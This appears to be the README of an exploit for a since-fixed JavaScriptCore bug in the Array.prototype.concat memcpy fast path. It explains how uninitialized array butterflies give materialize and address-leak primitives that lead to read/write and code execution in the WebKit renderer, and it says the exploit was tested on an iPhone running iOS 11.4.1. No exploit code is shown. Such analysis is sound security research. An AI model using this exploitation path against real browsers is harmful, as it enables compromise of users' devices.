For the detail on JavaScriptCore and terminology used 
refer to [0].

This is an exploit for a bug in JavaScriptCore function 
JSC::arrayProtoPrivateFuncConcatMemcpy, fixed via commit [1].

It's similar to the one described in JSC::JSArray::appendMemcpy
by lokihardt (see [4]). 

Both are optimizations (fast path) for Array.prototype.concat function.

The underlying problem is that JavaScriptCore arrays with UndecidedShape
might get butterflies which are not initialized. (For instance via
JSArray::tryCreateUninitializedRestricted method). The header is setup,
but the rest is left out as it is. The fast path functions mentioned above
both use memcpy to produce the final result. In the case the function fails
to properly determine the presence of an UndecidedShape array butterfly as memcpy 
argument it's going to place the values from uninitialized memory into 
the newly allocated butterfly and return it back to the caller.

This condition allows to produce materialize primitive (ability to
make javascript engine threat data at a given address as a javascript object)
as shown in project zero report. Besides, it allows to obtain a leak primitive
(ability to leak an arbitrary object address) as shown in this exploit. Having 
those two primitive is usually enough to get an arbitrary read/write and
execute within WebKit based renderer process. For instance see [3].

The initial attempt to fix the issue was made in [2], roughly a month after 
the lokihardt's report. It was not complete and only eliminated the 
ability to get materialize primitive. We can speculate that it might have been
related to the fact that project zero report only outlined the materialize 
primitive and left out the leak one, so the developer only added a check 
for ContiniousShape, but not for the DoubleShape case.

This particular exploit was tested on iPhone 8, running 11.4.1.
